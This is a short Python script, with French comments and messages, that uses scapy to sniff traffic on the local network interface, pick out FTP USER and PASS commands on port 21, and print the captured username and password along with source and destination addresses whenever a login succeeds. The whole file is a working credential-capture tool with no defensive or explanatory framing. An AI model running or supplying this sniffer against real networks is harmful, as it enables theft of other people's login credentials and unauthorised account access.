from scapy.all import *

username = []
password = []


def check_for_ftp(trame):
    if trame.haslayer("TCP") and trame.haslayer("Raw"):
        if (trame[0][1].sport) == 21 or (trame[0][1].dport) == 21:
            return True
        else:
            return False
    else:
        return False


def check_trame(trame):
    if check_for_ftp(trame):
        pass
    else:
        return
    data = trame[Raw].load  # on récupère les donnés dans ftp
    data = data.decode("utf-8")
    data = data.split()
    if "USER" in data:
        username.append(data[-1])
    elif "PASS" in data:
        password.append(data[-1])
    elif "230" in data:
        print(f"^*^ Un utilisateur vient de se connecter!")
        print(f"^*^ {trame[0][1].src} vers {trame[0][1].dst}")
        print(f"^*^ Le nom d'utilisateur est : {username[-1]}")
        print(f"^*^ Le mot de passe est : {password[-1]}")
        print(f"\n")
    return


print(f"On commence le 'sniffing' sur la carte {conf.iface}:")
print("\n")
sniff(prn=check_trame, store=0, iface=conf.iface)
